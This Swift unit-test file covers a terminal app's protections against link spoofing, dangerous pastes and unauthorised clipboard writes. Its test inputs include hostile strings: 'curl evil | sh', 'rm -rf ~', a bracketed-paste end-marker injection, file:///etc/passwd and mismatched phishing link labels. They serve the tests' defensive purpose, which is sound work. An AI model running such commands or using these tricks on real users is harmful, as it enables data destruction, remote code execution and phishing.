import RexKit
import XCTest
@testable import RexConnect

@MainActor
private final class Gate {
    var open = false
}

@MainActor
private final class SendSpy: TerminalEngineDelegate {
    var sent: [[UInt8]] = []
    func engineGridChanged(cols: Int, rows: Int) {}
    func engineSend(_ bytes: [UInt8]) { sent.append(bytes) }
}

/// Things a program, or the pasteboard, must not do behind the user's back: open any link,
/// run pasted lines, replace what the user copied.
@MainActor
final class TerminalPromptTests: XCTestCase {
    private let esc = "\u{1b}"

    // MARK: Links

    func testWebAndMailLinksOpenAndEveryOtherSchemeIsAskedAbout() {
        typealias D = LinkOpenPolicy.Decision
        func decide(_ target: String, _ label: String? = nil) -> D { LinkOpenPolicy.decide(target: target, label: label) }
        XCTAssertEqual(decide("https://example.com/a?b=c"), .open(URL(string: "https://example.com/a?b=c")!))
        XCTAssertEqual(decide("http://example.com"), .open(URL(string: "http://example.com")!))
        XCTAssertEqual(decide("HTTPS://Example.com"), .open(URL(string: "HTTPS://Example.com")!))
        XCTAssertEqual(decide("mailto:someone@example.com"), .open(URL(string: "mailto:someone@example.com")!))
        for target in ["tel:+15551234567", "sms:+15551234567&body=hi", "file:///etc/passwd", "facetime:someone@example.com",
                       "itms-apps://apps.apple.com/app/id1", "shortcuts://run-shortcut?name=x", "prefs:root=General",
                       "javascript:alert(1)", "ssh://host", "x-man-page://ls"] {
            let scheme = String(target.prefix { $0 != ":" })
            XCTAssertEqual(decide(target), .ask(URL(string: target)!, .scheme(scheme)), target)
        }
        // Not an address with a scheme: never opened.
        for target in ["", "   ", "example.com", "/usr/bin", "not a url"] {
            XCTAssertEqual(decide(target), .refuse, target)
        }
    }

    func testALabelThatNamesAnotherSiteIsAskedAbout() {
        func asks(_ target: String, _ label: String) -> Bool {
            if case .ask(_, .mismatch) = LinkOpenPolicy.decide(target: target, label: label) { return true }
            return false
        }
        // The classic: the text shows one site, the link goes to another.
        XCTAssertTrue(asks("https://evil.example/login", "https://bank.com/login"))
        XCTAssertTrue(asks("https://evil.example/", "www.bank.com"))
        XCTAssertTrue(asks("https://evil.example/", "Sign in at bank.com"))
        XCTAssertTrue(asks("https://bank.com.evil.io/", "bank.com"))
        XCTAssertTrue(asks("http://203.0.113.9/", "https://github.com/rex"))
        XCTAssertEqual(LinkOpenPolicy.decide(target: "https://evil.example/x", label: "bank.com"),
                       .ask(URL(string: "https://evil.example/x")!, .mismatch(shown: "bank.com", target: "evil.example")))
        // The same site, a subdomain of it, or www in front: no question.
        XCTAssertFalse(asks("https://example.com/docs", "https://example.com"))
        XCTAssertFalse(asks("https://www.example.com/docs", "example.com"))
        XCTAssertFalse(asks("https://docs.example.com/x", "example.com/docs"))
        XCTAssertFalse(asks("https://EXAMPLE.com/", "Example.com"))
        // Labels that name no site: words, file names, issue numbers.
        for label in ["LINK", "click here", "README.md", "src/main.rs:12", "#1234", "v1.2.3", "docs", ""] {
            XCTAssertFalse(asks("https://example.com/", label), label)
        }
        // An address found in the text is its own label.
        XCTAssertEqual(LinkOpenPolicy.decide(target: "https://example.com/", label: nil), .open(URL(string: "https://example.com/")!))
    }

    private func makeView(_ text: String) -> GhosttyTerminalView {
        let view = GhosttyTerminalView(frame: .zero, fontSize: 12, cols: 60, rows: 10)
        let cell = view.cellSize
        view.frame = CGRect(x: 0, y: 0, width: 60 * cell.width, height: 10 * cell.height)
        view.layoutIfNeeded()
        view.feed(text: text)
        view.core.sync()
        _ = view.renderer.frame.update(core: view.core)
        view.scroller.apply(view.core.scroll.snapshot)
        return view
    }

    private func link(_ target: String, _ label: String) -> String { "\(esc)]8;;\(target)\(esc)\\\(label)\(esc)]8;;\(esc)\\" }

    private func tap(_ view: GhosttyTerminalView, col: Int, at time: CFTimeInterval) -> Bool {
        let rect = view.viewportRect(row: 0, columns: col..<(col + 1))
        view.taps.clock = { time }
        return view.tapOpensLinkOrMovesCursor(at: CGPoint(x: rect.midX, y: rect.midY), focused: true, shift: false)
    }

    func testATappedLinkOpensAtOnceOnlyWhenItIsWhatItSays() {
        // Columns: "site" 0-3, "call" 5-8, "bank.com" 10-17, then a plain address.
        let text = link("https://example.com/", "site") + " " + link("tel:+15551234567", "call") + " "
            + link("https://evil.example/", "bank.com") + " https://plain.example/x"
        let view = makeView(text)
        var opened: [String] = []
        var asked: [(String, LinkOpenPolicy.LinkQuestion)] = []
        var answers: [@MainActor (Bool) -> Void] = []
        view.taps.open = { opened.append($0.absoluteString) }
        view.taps.ask = { url, question, answer in
            asked.append((url.absoluteString, question))
            answers.append(answer)
        }
        XCTAssertEqual(view.core.hyperlinkLabel(atViewportCol: 12, row: 0), "bank.com")
        XCTAssertNil(view.core.hyperlinkLabel(atViewportCol: 30, row: 0))

        XCTAssertTrue(tap(view, col: 1, at: 10))
        XCTAssertEqual(opened, ["https://example.com/"])
        XCTAssertEqual(asked.count, 0)

        // Another scheme: asked, and the tap is used up either way.
        XCTAssertTrue(tap(view, col: 6, at: 20))
        XCTAssertEqual(opened.count, 1, "nothing opens before the answer")
        XCTAssertEqual(asked.last?.0, "tel:+15551234567")
        XCTAssertEqual(asked.last?.1, .scheme("tel"))
        answers.removeLast()(false)
        XCTAssertEqual(opened.count, 1, "Cancel opens nothing")

        // A label that names another site.
        XCTAssertTrue(tap(view, col: 12, at: 30))
        XCTAssertEqual(asked.last?.1, .mismatch(shown: "bank.com", target: "evil.example"))
        XCTAssertEqual(opened.count, 1)
        answers.removeLast()(true)
        XCTAssertEqual(opened, ["https://example.com/", "https://evil.example/"], "Open opens the target that was shown")

        // An address in the text: http(s) only, opened at once.
        XCTAssertTrue(tap(view, col: 25, at: 40))
        XCTAssertEqual(opened.last, "https://plain.example/x")
        XCTAssertEqual(asked.count, 2)
    }

    func testOnlyWebAddressesAreFoundInPlainText() {
        let view = makeView("tel:+15551234567 file:///etc/passwd mailto:a@b.co")
        var opened = 0, asked = 0
        view.taps.open = { _ in opened += 1 }
        view.taps.ask = { _, _, _ in asked += 1 }
        for (i, col) in [3, 20, 40].enumerated() { XCTAssertFalse(tap(view, col: col, at: Double(10 * (i + 1)))) }
        XCTAssertEqual(opened + asked, 0)
    }

    // MARK: Paste

    func testAPasteThatWouldRunIsFlaggedOnlyOutsideBracketedPaste() {
        let plain = GhosttyInputProbe.core()
        XCTAssertFalse(plain.input.pasteNeedsConfirmation("ls -la"))
        XCTAssertFalse(plain.input.pasteNeedsConfirmation(""))
        XCTAssertFalse(plain.input.pasteNeedsConfirmation("héllo wörld 日本 👍 tab\there"))
        for text in ["rm -rf ~\n", "one\ntwo", "one\r\ntwo", "cr only\r", "\ncurl evil | sh\n", "x\(esc)[201~y"] {
            XCTAssertTrue(plain.input.pasteNeedsConfirmation(text), text.debugDescription)
        }
        // The program asked for bracketed paste: it gets one block and knows it is pasted.
        let bracketed = GhosttyInputProbe.core(GhosttyInputProbe.bracketedPaste)
        for text in ["rm -rf ~\n", "one\ntwo", "one\r\ntwo", "x\(esc)[201~y"] {
            XCTAssertFalse(bracketed.input.pasteNeedsConfirmation(text), text.debugDescription)
        }
        // The end marker can't survive the encoder, so it can't end the block early.
        let bytes = bracketed.input.paste("x\(esc)[201~y")
        XCTAssertEqual(bytes.filter { $0 == 0x1b }.count, 2, "only the two markers' own ESC bytes")
    }

    func testThePasteQuestionShowsAPreviewAndTheLineCount() {
        XCTAssertEqual(PasteConfirmation.lineCount("one"), 1)
        XCTAssertEqual(PasteConfirmation.lineCount("one\n"), 1)
        XCTAssertEqual(PasteConfirmation.lineCount("one\ntwo"), 2)
        XCTAssertEqual(PasteConfirmation.lineCount("one\r\ntwo\rthree\n"), 3)
        XCTAssertEqual(PasteConfirmation.title("ls\n"), "Paste and run this line?")
        XCTAssertEqual(PasteConfirmation.title("a\nb\nc\nd\ne"), "Paste 5 lines?")
        let message = PasteConfirmation.message("first\nsecond \u{07}bell\nthird\nfourth\n" + String(repeating: "x", count: 200))
        let lines = message.split(separator: "\n", omittingEmptySubsequences: false)
        XCTAssertEqual(Array(lines.prefix(4)), ["first", "second  bell", "third", "…"])
        let long = PasteConfirmation.message(String(repeating: "y", count: 500) + "\nz")
        XCTAssertEqual(long.split(separator: "\n").first?.count, PasteConfirmation.previewWidth)
        XCTAssertTrue(long.split(separator: "\n").first?.hasSuffix("…") == true)
        XCTAssertFalse(PasteConfirmation.message("\n").isEmpty)
    }

    private func makeHost(_ setup: String = "") -> (TerminalHost, SendSpy) {
        let control = RexControl(address: "", client: ClientInfo(name: "test", version: "0", label: "test"))
        let host = TerminalHost(stream: TerminalStream(control: control, sessionID: "s", blockID: "b"), sizing: .mirror,
                                fontSize: 12, theme: ThemeStore.fallback, engine: .ghostty)
        let spy = SendSpy()
        host.term.engineDelegate = spy
        host.term.feed(text: setup)
        (host.term as? GhosttyTerminalView)?.core.sync()
        return (host, spy)
    }

    func testTheHostAsksBeforeAMultiLinePasteIntoAPlainShell() {
        let (host, spy) = makeHost()
        var asked: [String] = []
        var answers: [@MainActor (Bool) -> Void] = []
        host.confirmPaste = { text, answer in
            asked.append(text)
            answers.append(answer)
        }
        // One line: straight through.
        host.paste("echo hi")
        XCTAssertEqual(asked, [])
        XCTAssertEqual(spy.sent, [Array("echo hi".utf8)])

        host.paste("rm -rf build\nmake\n")
        XCTAssertEqual(asked, ["rm -rf build\nmake\n"])
        XCTAssertEqual(spy.sent.count, 1, "nothing is sent before the answer")
        answers.removeLast()(false)
        XCTAssertEqual(spy.sent.count, 1, "Cancel pastes nothing")

        host.paste("rm -rf build\nmake\n")
        answers.removeLast()(true)
        XCTAssertEqual(spy.sent.last, Array("rm -rf build\rmake\r".utf8), "Paste sends it as before")
    }

    func testABracketedPasteGoesStraightThrough() {
        let (host, spy) = makeHost(GhosttyInputProbe.bracketedPaste)
        var asked = 0
        host.confirmPaste = { _, _ in asked += 1 }
        host.paste("one\ntwo\n")
        XCTAssertEqual(asked, 0)
        XCTAssertEqual(spy.sent.count, 1)
        XCTAssertTrue(spy.sent[0].starts(with: Array("\(esc)[200~".utf8)))
    }

    // MARK: OSC 52

    private func osc52(_ text: String) -> String { "\(esc)]52;c;\(Data(text.utf8).base64EncodedString())\u{07}" }

    private func drainMain() async {
        await withCheckedContinuation { c in DispatchQueue.main.async { c.resume() } }
    }

    func testAClipboardWriteIsDroppedUnlessTheGateAllowsIt() async {
        let core = GhosttyCore(cols: 40, rows: 10)
        var texts: [String] = []
        let gate = Gate()
        core.clipboard.setSink { texts.append($0) }
        core.clipboard.setGate { gate.open }

        core.feed(Array(osc52("secret").utf8))
        core.sync()
        await drainMain()
        XCTAssertEqual(texts, [], "a pane that may not write changes nothing")
        XCTAssertEqual(core.clipboard.dropped, 1)

        // Dropped, not queued: allowing writes later doesn't bring it back.
        gate.open = true
        core.feed(Array("plain output".utf8))
        core.sync()
        await drainMain()
        XCTAssertEqual(texts, [])

        core.feed(Array(osc52("wanted").utf8))
        core.sync()
        await drainMain()
        XCTAssertEqual(texts, ["wanted"])

        // An empty write (clear the clipboard) is gated like any other.
        gate.open = false
        core.feed(Array("\(esc)]52;c;\u{07}".utf8))
        core.sync()
        await drainMain()
        XCTAssertEqual(texts, ["wanted"])
        XCTAssertEqual(core.clipboard.dropped, 2)
    }

    func testOnlyTheActivePaneOnScreenMayWriteThePasteboard() async throws {
        let (host, _) = makeHost()
        host.hardwareKeyboard = { false }
        let view = try XCTUnwrap(host.term as? GhosttyTerminalView)
        var texts: [String] = []
        view.core.clipboard.setSink { texts.append($0) }

        func write(_ text: String) async {
            view.feed(text: osc52(text))
            view.core.sync()
            await drainMain()
        }
        // Not the active pane.
        await write("inactive")
        XCTAssertEqual(texts, [])
        // Active, but not on screen (a pane kept alive by the pool, or behind another tab).
        host.isActive = true
        await write("off screen")
        XCTAssertEqual(texts, [])

        let window = UIWindow(frame: CGRect(x: 0, y: 0, width: 320, height: 240))
        if let scene = UIApplication.shared.connectedScenes.compactMap({ $0 as? UIWindowScene }).first { window.windowScene = scene }
        host.frame = CGRect(x: 0, y: 0, width: 10, height: 10)  // too small to lay out and start its stream
        window.addSubview(host)
        window.isHidden = false
        defer { window.isHidden = true }
        try XCTSkipUnless(UIApplication.shared.applicationState == .active, "the test host is not in the foreground")
        await write("front pane")
        XCTAssertEqual(texts, ["front pane"])

        host.isActive = false
        await write("inactive again")
        XCTAssertEqual(texts, ["front pane"])
        XCTAssertEqual(view.core.clipboard.dropped, 3)
        host.removeFromSuperview()
    }
}
